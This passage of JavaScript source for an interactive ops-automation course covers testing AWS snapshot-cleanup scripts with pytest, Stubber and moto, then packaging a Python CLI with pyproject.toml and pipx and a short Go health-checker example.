        else f.push({ narr: 'Queue empty and every call matched: ' + H.c('g', 'test passes') + '. You proved the exact sequence of AWS calls, including the error branch, in milliseconds and without an account.', parts: [{ type: 'vars', label: 'result', vals: { 'pending responses': '0', test: 'PASSED' }, hl: { test: 'ok' } }] });
        return f;
      }
    }],
    examples: [
      { title: 'Making retries testable: inject the sleep', html: `<p>A retry loop with real <code>time.sleep</code> makes tests slow (31 s for one test!). Pass the sleep function in, with the real one as the default. The test passes a recorder instead and checks the exact delays. The same trick works for "now": pass a clock instead of calling <code>datetime.now()</code> inside the logic.</p>`, code: { lang: 'python', run: true, code: R`import time


def call_with_retry(fn, attempts=5, base=1.0, cap=8.0, sleep=time.sleep):
    for n in range(attempts):
        try:
            return fn()
        except ConnectionError:
            if n == attempts - 1:
                raise
            sleep(min(cap, base * 2 ** n))


waits = []
results = iter([ConnectionError(), ConnectionError(), ConnectionError(), "ok"])


def flaky():
    r = next(results)
    if isinstance(r, Exception):
        raise r
    return r


assert call_with_retry(flaky, sleep=waits.append) == "ok"
print("delays used:", waits, "- test took no real time")
# Output:
# delays used: [1.0, 2.0, 4.0] - test took no real time` } },
      { title: 'Testing log output and files with pytest fixtures', html: `<p>pytest gives you ready-made helpers as function arguments. <code>tmp_path</code> is a fresh folder per test (perfect for the log-rotation script), <code>caplog</code> captures logging records, <code>capsys</code> captures stdout and stderr, and <code>monkeypatch</code> sets environment variables that are undone after the test.</p>`, code: R`import gzip
import logging

from opstools.rotate_logs import main


def test_rotation_dry_run_changes_nothing(tmp_path, caplog):
    (tmp_path / "app.log").write_text("line\n")
    with gzip.open(tmp_path / "app.log.1.gz", "wt") as f:
        f.write("old\n")
    before = sorted(p.name for p in tmp_path.iterdir())
    with caplog.at_level(logging.INFO):
        assert main([str(tmp_path), "--keep", "1"]) == 0
    assert sorted(p.name for p in tmp_path.iterdir()) == before          # dry run: untouched
    assert "WOULD delete app.log.1.gz" in caplog.text


def test_alert_skipped_without_webhook(monkeypatch, caplog):
    from opstools.alerts import alert
    monkeypatch.delenv("SLACK_WEBHOOK_URL", raising=False)
    assert alert("disk full") is False
    assert "not set" in caplog.text` },
      { title: 'Which tool for which test?', html: `<p>A rough test pyramid for an ops tool: many fast unit tests of pure functions, some Stubber tests that pin exact AWS calls and error branches, a few moto tests for whole flows, and one manual or scheduled run in a sandbox account before rollout.</p>
        ${H.table(['Question', 'Best tool', 'Speed'], [['Is the 30-day boundary right?', 'plain unit test', 'microseconds'], ['Does dry run make zero writes?', 'fake or Mock', 'milliseconds'], ['Does InUse get skipped and AccessDenied stop?', 'Stubber', 'milliseconds'], ['Does a full run leave the right resources?', 'moto', 'about a second'], ['Do IAM permissions really allow it?', 'sandbox account run', 'minutes']])}<p>Note what no mock can tell you: whether the <b>IAM policy</b> allows the calls. moto does not enforce IAM by default, so keep one real run in a sandbox account in your release checklist.</p>` }
    ],
    deepDive: `<p>🟣 <b>Stubber details.</b> <code>add_response(method, service_response, expected_params)</code>: the response is validated against the service model, so a typo in a field name fails the test (a good thing). <code>expected_params</code> must match exactly; use <code>botocore.stub.ANY</code> for values you do not care about. Paginators work with Stubber: queue one response per page and include the token in the next expected params. Stubber needs a client created with a region; it short-circuits before signing, so no credentials are used, but setting fake ones in a fixture is still good hygiene.</p>
      <p><b>moto 5.</b> All the per-service decorators (<code>mock_ec2</code>, <code>mock_s3</code>) were replaced by one <code>@mock_aws</code> (also usable as a context manager). Create clients <b>inside</b> the mocked scope. moto's fake account id is <code>123456789012</code> by default, which is also why that number appears in AWS docs. Coverage of services and edge cases varies: moto may accept parameters the real API rejects, so moto passing is necessary but not sufficient.</p>
      <p><b>Mock pitfalls.</b> A bare <code>Mock()</code> accepts any method name, so a typo like <code>ec2.delete_snapshots</code> silently "works". Use <code>mock.create_autospec</code> or Stubber, which check names against the real API. <code>patch</code> where the name is <b>looked up</b>, not where it is defined: patch <code>opstools.cleanup.datetime</code>, not <code>datetime.datetime</code>.</p>
      <p><b>CI.</b> Run tests on every pull request with no AWS credentials in the CI environment at all; tests that need AWS must use moto or Stubber. Add <code>ruff</code> for lint, <code>mypy</code> if you use type hints, and <code>pip-audit</code> for vulnerable dependencies. For the sandbox integration run, use OIDC to assume a role that can only touch resources tagged <code>Purpose=ci-test</code>.</p>`,
    aiEra: `<p>🤖 <b>What AI changes:</b> writing tests is one of the most valuable things to delegate. Give an assistant your function and ask for pytest cases covering boundaries, empty input, multiple pages and each error code; it produces them quickly and often thinks of a case you missed. It also knows the Stubber and moto APIs well enough to get the boilerplate right.</p>
      <p><b>Where it goes wrong:</b> AI-written tests often test the mock rather than the code (asserting that a Mock returns what it was told to return), use a bare <code>Mock()</code> that hides misspelled API calls, copy the implementation's logic into the expected values (so a bug is tested as "correct"), and sometimes use outdated moto decorators like <code>mock_ec2</code>. <b>Your job:</b> compute expected values independently (by hand, as in this module's problems), make one test fail on purpose to prove it can fail, prefer Stubber or autospec over bare mocks, and keep real credentials out of the test environment entirely.</p>`,
    problems: [P({
      t: 'Write the test suite for the snapshot cleanup', l: 'Medium', tags: ['pytest', 'Stubber', 'moto', 'testing'], co: ['Amazon', 'Thoughtworks', 'PhonePe'],
      s: `<p>Your team will only merge <code>clean_snapshots.py</code> (from the boto3 topic) with tests. Write a pytest file that proves: (1) <code>--apply</code> without <code>--yes</code> exits with code 2; (2) the dry run makes <b>no</b> <code>delete_snapshot</code> call; (3) <code>InvalidSnapshot.InUse</code> is skipped and the run continues; (4) <code>InvalidSnapshot.NotFound</code> counts as done; (5) the account guard refuses a mismatched account. No test may reach a real AWS account.</p>`,
      ex: `<p>Expected run: <code>pytest -q</code> → ${H.c('g', '5 passed')}. If someone later changes the default to delete, test (2) fails with "UnStubbedResponseError: Unexpected call to delete_snapshot" (Stubber) or "expected 1 snapshot, found 0" (moto).</p>`,
      bw: `<p>"Testing" by running the script against the shared dev account with <code>--apply</code> and looking at the console. It is slow, it deletes real data that colleagues may need, it cannot produce error cases like <code>InUse</code> on demand, and it proves nothing for the next change.</p>`,
      q: ['Your test for "dry run never deletes" uses <code>ec2 = Mock()</code>, and passes. Later someone renames the call to <code>ec2.delete_snapshots(...)</code> (a typo). What happens?', ['Tests still pass: a bare Mock accepts any attribute, so the typo is invisible', 'Tests fail with AttributeError', 'Python refuses to run the file', 'The Mock raises a warning'], 0, 'Mock() creates attributes on demand. Use mock.create_autospec(real_client) or Stubber, which validate operation names and parameters against the real service model.'],
      h: ['<p>Hint 1: use an autouse fixture that sets fake credentials and a region and removes <code>AWS_PROFILE</code>; this is your seat belt.</p>', '<p>Hint 2: for exact call sequences and error codes use Stubber with <code>add_response</code> / <code>add_client_error</code>; finish with <code>assert_no_pending_responses()</code>. Stub <code>sts.get_caller_identity</code> too.</p>', '<p>Hint 3: to stub clients that the script creates itself, patch <code>boto3.Session</code> in the script module to return a session whose <code>client()</code> hands back your stubbed clients; or use moto\'s <code>@mock_aws</code> for the flow tests.</p>'],
      a: `<p>Structure: one autouse fixture for fake credentials, one fixture that builds stubbed <code>sts</code> and <code>ec2</code> clients and patches <code>boto3.Session</code> in the script's module so <code>main()</code> receives them. Each test queues exactly the calls it expects: <code>get_caller_identity</code> returning account 123456789012, a <code>describe_snapshots</code> page, then deletes or errors. The dry-run test queues <b>no</b> delete, so any delete call fails the test. Argument tests need no stubs: <code>pytest.raises(SystemExit)</code> and check <code>.code == 2</code>. Finish each test with <code>assert_no_pending_responses()</code> so skipped calls are caught too.</p>`,
      code: `from datetime import datetime, timedelta, timezone
from unittest import mock

import boto3
import pytest
from botocore.stub import Stubber

import opstools.clean_snapshots as cs

ACCOUNT = "123456789012"
OLD = datetime.now(timezone.utc) - timedelta(days=60)


@pytest.fixture(autouse=True)
def no_real_aws(monkeypatch):
    monkeypatch.delenv("AWS_PROFILE", raising=False)
    monkeypatch.setenv("AWS_ACCESS_KEY_ID", "testing")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "testing")


@pytest.fixture
def stubs(monkeypatch):
    sts = boto3.client("sts", region_name="eu-west-1")
    ec2 = boto3.client("ec2", region_name="eu-west-1")
    session = mock.Mock()
    session.client.side_effect = lambda name, **kw: {"sts": sts, "ec2": ec2}[name]
    monkeypatch.setattr(cs.boto3, "Session", lambda **kw: session)
    with Stubber(sts) as s_sts, Stubber(ec2) as s_ec2:
        yield s_sts, s_ec2
        s_sts.assert_no_pending_responses()
        s_ec2.assert_no_pending_responses()


def queue_listing(s_sts, s_ec2, account=ACCOUNT, ids=("snap-1",)):
    s_sts.add_response("get_caller_identity", {"Account": account, "Arn": "arn:aws:sts::%s:assumed-role/ops/me" % account, "UserId": "AID"})
    if account == ACCOUNT:
        s_ec2.add_response("describe_snapshots",
                           {"Snapshots": [{"SnapshotId": i, "StartTime": OLD, "VolumeSize": 8} for i in ids]},
                           {"OwnerIds": ["self"]})


ARGS = ["--account", ACCOUNT, "--region", "eu-west-1", "--days", "30"]


def test_apply_without_yes_exits_2():
    with pytest.raises(SystemExit) as e:
        cs.main(ARGS + ["--apply"])
    assert e.value.code == 2


def test_dry_run_makes_no_delete(stubs):
    queue_listing(*stubs)                          # no delete queued: any delete call fails the test
    assert cs.main(ARGS) == 0


def test_in_use_is_skipped_and_run_continues(stubs):
    s_sts, s_ec2 = stubs
    queue_listing(s_sts, s_ec2, ids=("snap-1", "snap-2"))
    s_ec2.add_client_error("delete_snapshot", service_error_code="InvalidSnapshot.InUse",
                           expected_params={"SnapshotId": "snap-1"})
    s_ec2.add_response("delete_snapshot", {}, {"SnapshotId": "snap-2"})
    assert cs.main(ARGS + ["--apply", "--yes"]) == 0


def test_not_found_counts_as_done(stubs):
    s_sts, s_ec2 = stubs
    queue_listing(s_sts, s_ec2)
    s_ec2.add_client_error("delete_snapshot", service_error_code="InvalidSnapshot.NotFound",
                           expected_params={"SnapshotId": "snap-1"})
    assert cs.main(ARGS + ["--apply", "--yes"]) == 0


def test_wrong_account_is_refused(stubs):
    queue_listing(*stubs, account="210987654321")  # credentials point at another account
    assert cs.main(ARGS + ["--apply", "--yes"]) == 2`,
      cx: `<p>The whole suite runs in well under a second, needs no network, and pins the five behaviours that would cause an incident if they regressed.</p>`,
      f: ['Add a test with two <code>describe_snapshots</code> pages. What must the second expected_params contain?', 'Which of these behaviours would moto alone not let you test easily, and why?']
    })]
  });

  // ───────────────────────── Topic 8: packaging a CLI, and a short look at Go ─────────────────────────
  var GO_SRC = R`
// healthcheck: check several URLs in parallel and exit non-zero if any is down.
// Build once, copy one file anywhere:  go build -o healthcheck .
// Cross-compile for a Graviton server:  GOOS=linux GOARCH=arm64 CGO_ENABLED=0 go build -o healthcheck-linux-arm64 .
package main

import (
	"flag"
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"
)

type result struct {
	url    string
	status int
	err    error
}

func check(client *http.Client, url string) result {
	resp, err := client.Get(url)
	if err != nil {
		return result{url: url, err: err}
	}
	defer resp.Body.Close()
	return result{url: url, status: resp.StatusCode}
}

func main() {
	timeout := flag.Duration("timeout", 5*time.Second, "timeout per request")
	flag.Parse()
	urls := flag.Args()
	if len(urls) == 0 {
		fmt.Fprintln(os.Stderr, "usage: healthcheck [-timeout 5s] URL [URL...]")
		os.Exit(2)
	}

	client := &http.Client{Timeout: *timeout}
	results := make([]result, len(urls))
	var wg sync.WaitGroup
	for i, u := range urls {
		wg.Add(1)
		go func(i int, u string) { // one goroutine per URL: cheap, runs in parallel
			defer wg.Done()
			results[i] = check(client, u)
		}(i, u)
	}
	wg.Wait()

	failed := 0
	for _, r := range results {
		switch {
		case r.err != nil:
			failed++
			fmt.Printf("DOWN %s (%v)\n", r.url, r.err)
		case r.status >= 400:
			failed++
			fmt.Printf("DOWN %s (HTTP %d)\n", r.url, r.status)
		default:
			fmt.Printf("UP   %s (HTTP %d)\n", r.url, r.status)
		}
	}
	if failed > 0 {
		os.Exit(1)
	}
}
`;
  topics.push({
    title: 'Shipping the Tool: Packaging a Python CLI with pyproject.toml and pipx, and a Short Look at Go',
    analogy: `<p>A script in someone's home folder is a <b>recipe on a sticky note</b>: it works for the person who wrote it, if they remember which ingredients (library versions) to buy. A packaged CLI is a <b>boxed meal kit</b>: a name on the box (<code>snapclean</code>), a list of ingredients that come with it, and instructions that work in any kitchen. <code>pipx</code> gives each kit its <b>own shelf</b>, so one tool's ingredients never spoil another's. And Go is like a <b>ready meal</b>: one sealed tray (a single binary) that you heat anywhere, without even owning a pantry (no Python on the server).</p>`,
    explain: `<p>🟢 <b>From script to command.</b> Once a script is shared by a team, it should be <b>installed</b>, not copied. A modern Python package needs one file, <code>pyproject.toml</code>, next to your code:</p>
      <ul>
        <li><code>[project]</code>: name, version, <code>requires-python</code>, and <code>dependencies</code> (<code>boto3</code>, <code>requests</code>, <code>pyyaml</code>) with sensible lower bounds.</li>
        <li><code>[project.scripts]</code>: the magic line. <code>snapclean = "opstools.clean_snapshots:main"</code> means "create a command called <b>snapclean</b> that calls <code>main()</code> in that module". The installer generates a small launcher on <code>PATH</code>, and the return value of <code>main()</code> becomes the exit code.</li>
        <li><code>[build-system]</code>: which build backend to use (hatchling, setuptools, flit, or uv's backend).</li>
      </ul>
      <p>🟢 <b>Installing it.</b> <code>pipx install .</code> (or <code>pipx install git+https://github.com/acme/opstools@v1.4.0</code>) creates a private virtual environment for the tool and puts only its commands on your PATH. No clashes with other tools' library versions, no <code>sudo pip install</code> polluting the system Python (which modern Linux distributions block anyway, with the "externally-managed-environment" error). <code>uv tool install .</code> does the same, faster. <code>pipx upgrade opstools</code> and <code>pipx uninstall opstools</code> keep it tidy.</p>
      <p>🔵 <b>click and typer.</b> argparse is in the standard library and fine for most tools. For tools with many sub-commands (<code>opstools snapshots clean</code>, <code>opstools logs rotate</code>), <b>click</b> (decorators, prompts, <code>confirmation_option</code>, colours) and <b>typer</b> (builds the CLI from type hints, on top of click) save code. Pick one per team.</p>
      <p>🔵 <b>Why ops teams also use Go.</b> Many of the tools you use daily are written in Go: Terraform, kubectl, Docker, Helm, Prometheus, the GitHub CLI. The reasons are practical:</p>
      ${H.table(['Need', 'Python', 'Go'], [
        ['Install on a server or in a container', 'needs a Python runtime + dependencies (virtualenv, pipx, or a bigger image)', '<b>one static binary</b>: copy it and run, even in a <code>FROM scratch</code> image'],
        ['Build for other platforms', 'pure Python is portable, but compiled dependencies differ per platform', '<b>cross-compile</b> with <code>GOOS=linux GOARCH=arm64 go build</code> from any laptop'],
        ['Start-up time', 'a few hundred ms to import boto3', 'milliseconds: good for hooks, sidecars, CLIs run thousands of times'],
        ['Concurrency', 'threads (I/O-bound OK, GIL for CPU) or asyncio', 'goroutines and channels built in, true parallelism'],
        ['Speed of writing a quick script', H.c('g', 'very fast, huge ecosystem, great for glue and data'), 'more verbose, explicit error handling everywhere'],
        ['Kubernetes / cloud-native ecosystem', 'official clients exist', 'native: client-go, operators, controller-runtime']
      ])}
      <p>The usual split: <b>Python</b> for automation scripts, glue, reports and anything data-heavy; <b>Go</b> when you ship a tool to many machines or users, need a tiny container, or extend Kubernetes. You do not need Go for this module; the snippet below is just to show its shape.</p>`,
    clues: [
      '"share this script with the team" / "make it a command" → <code>pyproject.toml</code> with <code>[project.scripts]</code>, install with <code>pipx</code> or <code>uv tool</code>',
      '"pip install broke system tools" / "externally-managed-environment" → never sudo pip; use pipx or a virtualenv',
      '"pin the version used in cron/CI" → install a tagged release (<code>pipx install git+...@v1.4.0</code>) or a wheel from an internal index',
      '"the tool must run on servers without Python" / "tiny container" → a Go static binary',
      '"build for Linux ARM (Graviton) from a Mac" → <code>GOOS=linux GOARCH=arm64 CGO_ENABLED=0 go build</code>',
      '"many sub-commands, prompts, confirmations" → click or typer instead of raw argparse'
    ],
    code: [{ lang: 'text', code: `# pyproject.toml  (repo layout: pyproject.toml, src/opstools/__init__.py, src/opstools/clean_snapshots.py, tests/)
[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[project]
name = "opstools"
version = "1.4.0"
description = "Team automation: snapshot cleanup, log rotation, tag compliance"
requires-python = ">=3.11"
dependencies = [
    "boto3>=1.34",
    "requests>=2.32",
    "pyyaml>=6.0",
]

[project.optional-dependencies]
test = ["pytest>=8", "moto[ec2,s3]>=5", "ruff"]

[project.scripts]
snapclean = "opstools.clean_snapshots:main"     # command name = "module.path:function"
rotate-logs = "opstools.rotate_logs:main"
ensure-tags = "opstools.ensure_tags:main"

# Install for yourself:       pipx install .            (or: uv tool install .)
# Install a pinned release:   pipx install "git+https://github.com/acme/opstools@v1.4.0"
# Develop with tests:         python -m venv .venv && . .venv/bin/activate && pip install -e ".[test]" && pytest
# Then simply run:            snapclean --account 123456789012 --region eu-west-1 --days 30` }, R`"""opstools/cli.py - the same tool family with click: sub-commands, env defaults and a confirmation.
pip install click   ->   [project.scripts] opstools = "opstools.cli:cli"
"""
import sys

import click


@click.group()
@click.option("--profile", envvar="AWS_PROFILE", help="AWS profile (default: the normal credential chain)")
@click.option("--region", envvar="AWS_REGION", required=True)
@click.pass_context
def cli(ctx, profile, region):
    """Team automation tools."""
    ctx.obj = {"profile": profile, "region": region}


@cli.group()
def snapshots():
    """EBS snapshot housekeeping."""


@snapshots.command("clean")
@click.option("--days", type=click.IntRange(min=1), default=30, show_default=True)
@click.option("--account", required=True, help="expected account id, e.g. 123456789012")
@click.option("--apply", is_flag=True, help="really delete (default: dry run)")
@click.option("--yes", is_flag=True, help="skip the interactive confirmation")
@click.pass_obj
def clean(obj, days, account, apply, yes):
    """Delete untagged snapshots older than DAYS."""
    if apply and not yes:
        click.confirm(f"Delete snapshots in {account} / {obj['region']}?", abort=True)
    from opstools.clean_snapshots import main as run      # reuse the tested core
    argv = ["--account", account, "--region", obj["region"], "--days", str(days)]
    if obj["profile"]:
        argv += ["--profile", obj["profile"]]
    if apply:
        argv += ["--apply", "--yes"]
    sys.exit(run(argv))


if __name__ == "__main__":
    cli()`, { lang: 'go', check: false, code: GO_SRC.trim() }],
    codeTitle: ['pyproject.toml with [project.scripts] entry points', 'The same tool as click sub-commands', 'Go: a parallel health checker as one static binary'],
    viz: [{
      title: 'From pyproject.toml to a command on your PATH',
      input: 'snapclean',
      inputLabel: 'command name to install',
      gen: function (input) {
        var name = String(input || '').trim();
        if (!/^[a-z][a-z0-9-]{1,24}$/.test(name)) throw new Error('Use a lowercase command name like snapclean (letters, digits, dashes)');
        var N = [box('toml', 'pyproject.toml', 12, 8, 20), box('wheel', 'wheel (.whl)', 38, 8, 18), box('venv', 'pipx venv', 64, 8, 18), box('deps', 'boto3, pyyaml', 64, 30, 18), box('shim', '~/.local/bin/' + name, 88, 8, 22), box('main', 'opstools...:main()', 88, 30, 22), box('shell', 'your shell / cron', 38, 30, 20)];
        var E = [['toml', 'wheel', 'build'], ['wheel', 'venv', 'install'], ['venv', 'deps', ''], ['venv', 'shim', 'link'], ['shell', 'shim', 'runs'], ['shim', 'main', 'calls']];
        function fr(narr, hl, ehl, extra) { var p = [{ type: 'graph', label: 'packaging flow', height: 42, nodes: N, edges: E, hl: hl, ehl: ehl || {} }]; if (extra) p.push(extra); return { narr: narr, parts: p }; }
        return [
          fr('<code>pyproject.toml</code> declares the package, its dependencies and the entry point <code>' + name + ' = "opstools.clean_snapshots:main"</code>.', { toml: 'cur' }, {}, { type: 'code', label: 'pyproject.toml', lang: 'text', code: '[project.scripts]\n' + name + ' = "opstools.clean_snapshots:main"', hl: { 2: 'sel' } }),
          fr('<code>pipx install .</code> first <b>builds a wheel</b>: a zip of your code plus metadata, including the entry point list.', { toml: 'done', wheel: 'cur' }, { 'toml-wheel': 'cur' }),
          fr('pipx creates a <b>private virtual environment</b> just for this tool and installs the wheel and its dependencies there. Other tools keep their own versions; the system Python is untouched.', { wheel: 'done', venv: 'cur', deps: 'ok' }, { 'wheel-venv': 'cur', 'venv-deps': 'ok' }),
          fr('The installer writes a tiny launcher script <b>' + name + '</b> for the entry point and pipx exposes it in <code>~/.local/bin</code>, which is on your PATH (<code>pipx ensurepath</code>).', { venv: 'done', shim: 'ok' }, { 'venv-shim': 'ok' }),
          fr('Now anyone (or cron) types <code>' + name + ' --days 30</code>. The launcher starts the venv\'s Python, imports the module and calls <code>main()</code>; its return value becomes the <b>exit code</b>.', { shell: 'cur', shim: 'ok', main: 'sel' }, { 'shell-shim': 'cur', 'shim-main': 'sel' }),
          fr('Upgrades are one command (<code>pipx upgrade opstools</code>) and a broken release rolls back with <code>pipx install --force opstools==1.3.2</code> from your index. Compare with "scp the script and hope the server has the right boto3".', { toml: 'done', wheel: 'done', venv: 'done', deps: 'done', shim: 'ok', main: 'ok', shell: 'done' }, {})
        ];
      }
    }, {
      title: 'Go cross-compiling: one build machine, many targets',
      input: 'linux/amd64, linux/arm64, darwin/arm64, windows/amd64',
      inputLabel: 'targets as GOOS/GOARCH (max 6)',
      gen: function (input) {
        var t = csv(input);
        var OS = ['linux', 'darwin', 'windows', 'freebsd'], AR = ['amd64', 'arm64', '386', 'arm'];
        if (!t.length || t.length > 6) throw new Error('Give 1-6 targets like linux/arm64');
        t.forEach(function (x) { var p = x.split('/'); if (p.length !== 2 || OS.indexOf(p[0]) < 0 || AR.indexOf(p[1]) < 0) throw new Error('Unknown target "' + x + '": GOOS one of ' + OS.join('/') + ', GOARCH one of ' + AR.join('/')); });
        var rows = [], f = [];
        f.push({ narr: 'You have one laptop. Go\'s compiler can produce binaries for other systems by setting two environment variables: <code>GOOS</code> (operating system) and <code>GOARCH</code> (CPU). With <code>CGO_ENABLED=0</code> the result is fully static: no libc, no runtime to install.', parts: [{ type: 'array', label: 'targets', values: t }] });
        t.forEach(function (x, i) {
          var p = x.split('/'), file = 'healthcheck-' + p[0] + '-' + p[1] + (p[0] === 'windows' ? '.exe' : '');
          var where = p[0] === 'linux' ? (p[1] === 'arm64' ? 'Graviton EC2, Raspberry Pi 4/5, ARM containers' : 'most servers and CI runners') : p[0] === 'darwin' ? (p[1] === 'arm64' ? 'Apple Silicon Macs' : 'Intel Macs') : p[0] === 'windows' ? 'Windows hosts' : 'BSD hosts / appliances';
          rows.push([x, file, where]);
          var hl = {}; hl[i] = 'ok';
          f.push({ narr: '<code>GOOS=' + p[0] + ' GOARCH=' + p[1] + ' CGO_ENABLED=0 go build -o ' + file + '</code>. Same source, no extra toolchain. Runs on: ' + where + '.', parts: [{ type: 'table', label: 'release artifacts', columns: ['target', 'file', 'runs on'], rows: rows.slice(), hl: hl }] });
        });
        f.push({ narr: 'Ship these files as release assets (tools like GoReleaser automate this, plus checksums and signatures). Installing on a server is just: download, verify the checksum, <code>chmod +x</code>, done. For Python the equivalent needs a matching interpreter and wheels for each platform.', parts: [{ type: 'table', label: 'release artifacts', columns: ['target', 'file', 'runs on'], rows: rows.slice() }] });
        return pad4(f, 'Add more targets.');
      }
    }],
    examples: [
      { title: 'Calling the same tool from cron, the right way', html: `<p>Once the tool is installed with pipx for a service user, cron calls a stable path, and the virtual environment's Python and pinned libraries come along automatically. Configuration such as the webhook URL is read from an environment file only that user can read (mode 600), never from the crontab itself.</p>`, code: { lang: 'bash', code: `# crontab of the 'ops' user (crontab -e)
# m  h  dom mon dow  command
15 2  *   *   *    . "$HOME/.config/opstools/env" && "$HOME/.local/bin/snapclean" --account 123456789012 --region eu-west-1 --days 30 --apply --yes >> "$HOME/logs/snapclean.log" 2>&1
# ~/.config/opstools/env (chmod 600) contains: export SLACK_WEBHOOK_URL=... and AWS_PROFILE=ops-cleanup
# On EC2 prefer the instance role: then no AWS_PROFILE is needed at all.` } },
      { title: 'Version and help: what a good CLI always has', html: `<p>Two cheap features save hours in incidents: <code>--version</code> (so a log line or bug report says which release ran) and helpful <code>--help</code> with examples. Read the version from the installed package metadata so it can never drift from <code>pyproject.toml</code>.</p>`, code: { lang: 'python', run: true, code: R`import argparse
from importlib.metadata import PackageNotFoundError, version

try:
    VERSION = version("opstools")                      # from the installed package's metadata
except PackageNotFoundError:
    VERSION = "0.0.0+dev"                              # running from a source checkout

p = argparse.ArgumentParser(prog="snapclean",
                            epilog="example: snapclean --account 123456789012 --region eu-west-1 --days 30")
p.add_argument("--version", action="version", version=f"%(prog)s {VERSION}")
p.add_argument("--days", type=int, default=30)
print(p.format_help().splitlines()[0])
try:
    p.parse_args(["--version"])                        # prints the version and exits 0
except SystemExit as e:
    print("exit code:", e.code)
# Output:
# usage: snapclean [-h] [--version] [--days DAYS]
# snapclean 0.0.0+dev
# exit code: 0` } },
      { title: 'Python or Go for this tool? A quick decision', html: `<p>Use the questions in the table. Two or more "Go" answers usually mean Go is worth its extra verbosity; otherwise Python's speed of development wins.</p>
        ${H.table(['Question', 'If yes, lean to'], [['Runs on hundreds of machines you do not control?', 'Go'], ['Must fit in a tiny or distroless container?', 'Go'], ['Called thousands of times (git hook, kubectl plugin, sidecar)?', 'Go'], ['Mostly glue around AWS/HTTP APIs and data shaping?', 'Python'], ['Written and changed often by the whole team, including non-Go devs?', 'Python'], ['Needs pandas, reporting or quick one-off analysis?', 'Python']])}` }
    ],
    deepDive: `<p>🟣 <b>Entry points in detail.</b> <code>[project.scripts]</code> creates console commands; <code>[project.gui-scripts]</code> the same for GUI apps on Windows; <code>[project.entry-points."group"]</code> declares plugins other packages can discover (that is how pytest plugins work). The function is called with no arguments, so <code>main(argv=None)</code> must fall back to <code>sys.argv[1:]</code> (argparse does this when you pass <code>None</code>). If <code>main()</code> returns an int it becomes the exit code; returning <code>None</code> means 0.</p>
      <p><b>Reproducible installs.</b> The package lists <b>ranges</b> (<code>boto3&gt;=1.34</code>) so it can be installed alongside others; for deployment (a container image, a CI job) pin exact versions with a lock file (<code>uv lock</code>, <code>pip-compile</code>) or a constraints file, and rebuild regularly to pick up security fixes. Publish to an internal index (CodeArtifact, Artifactory, GitLab package registry) rather than installing from random Git branches.</p>
      <p><b>Containers.</b> For tools run by schedulers (ECS scheduled tasks, Kubernetes CronJobs), the "package" is often a container image: <code>python:3.12-slim</code> + <code>pip install .</code> as a non-root user, with credentials from the task or pod role. A Go tool can go into a <code>FROM scratch</code> or distroless image of a few MB; remember to copy CA certificates for HTTPS.</p>
      <p><b>Go details worth knowing.</b> Errors are values (<code>if err != nil</code>) rather than exceptions, which makes failure paths explicit. <code>CGO_ENABLED=0</code> gives a static binary but uses Go's own DNS resolver (fine in almost all cases). The AWS SDK for Go v2 has the same concepts you learnt here: credential chain, paginators (<code>ec2.NewDescribeSnapshotsPaginator</code>), waiters and typed errors. The skills transfer directly.</p>`,
    aiEra: `<p>🤖 <b>What AI changes:</b> packaging boilerplate (<code>pyproject.toml</code>, a click CLI skeleton, a GitHub Actions release workflow, a GoReleaser config) is exactly the kind of text assistants produce well. Assistants also make Go far more approachable for Python-first teams: "translate this Python health checker to idiomatic Go" gives a solid starting point, and they explain goroutines and error handling patterns patiently.</p>
      <p><b>Where it goes wrong:</b> generated packaging often mixes old and new styles (<code>setup.py</code> plus <code>pyproject.toml</code>, deprecated <code>setup.cfg</code> keys), suggests <code>sudo pip install</code>, or pins nothing at all. Go translations can leak goroutines, ignore errors (<code>_ = err</code>), or forget timeouts on <code>http.Client</code> (the default client has none). <b>Your job:</b> install the result in a clean environment (<code>pipx install .</code> in a fresh container) to prove it works, check the tool's <code>--version</code> and exit codes, run <code>go vet</code> and tests on Go code, and keep the same safety contract (dry run default, confirmation, secrets from the environment) whichever language the tool is in.</p>`,
    problems: [P({
      t: 'Turn three team scripts into one installable toolkit', l: 'Easy', tags: ['packaging', 'pyproject.toml', 'pipx', 'entry points'], co: ['Atlassian', 'GitLab', 'Zerodha'],
      s: `<p>Your team has <code>clean_snapshots.py</code>, <code>rotate_logs.py</code> and <code>ensure_tags.py</code> copied around by <code>scp</code>; servers run different versions and one uses a boto3 from 2019. Package them as one project, <code>opstools</code>, so that <code>pipx install</code> gives three commands (<code>snapclean</code>, <code>rotate-logs</code>, <code>ensure-tags</code>), each with <code>--version</code>, and the tests run with <code>pytest</code>. Show the layout, <code>pyproject.toml</code>, and the commands to install a pinned release on a server.</p>`,
      ex: `<p>After <code>pipx install "git+https://github.com/acme/opstools@v1.4.0"</code>, running <code>snapclean --version</code> prints ${H.c('g', 'snapclean 1.4.0')} on every server, and <code>which snapclean</code> shows ${H.c('b', '~/.local/bin/snapclean')}.</p>`,
      bw: `<p>Copying scripts with <code>scp</code> and installing libraries with <code>sudo pip install boto3</code>. Every server ends up with a different mix, upgrades break unrelated system tools, nobody can tell which version ran last night, and on current Debian/Ubuntu <code>sudo pip</code> is refused with "externally-managed-environment".</p>`,
      q: ['What does <code>snapclean = "opstools.clean_snapshots:main"</code> under <code>[project.scripts]</code> do?', ['Creates a <code>snapclean</code> command that imports the module and calls <code>main()</code>, using its return value as the exit code', 'Runs <code>main()</code> once at install time', 'Renames the module to snapclean', 'Adds an alias to your shell profile'], 0, 'The installer generates a small launcher for each entry point in the environment\'s bin directory; pipx links it onto your PATH.'],
      h: ['<p>Hint 1: use the <code>src/</code> layout: <code>src/opstools/__init__.py</code> plus one module per tool, and <code>tests/</code> next to <code>src/</code>.</p>', '<p>Hint 2: each module needs <code>main(argv=None)</code> returning an int; list all three under <code>[project.scripts]</code>.</p>', '<p>Hint 3: read the version with <code>importlib.metadata.version("opstools")</code>, tag releases in Git, and install with <code>pipx install "git+...@vX.Y.Z"</code> (or from an internal index) for reproducible servers.</p>'],
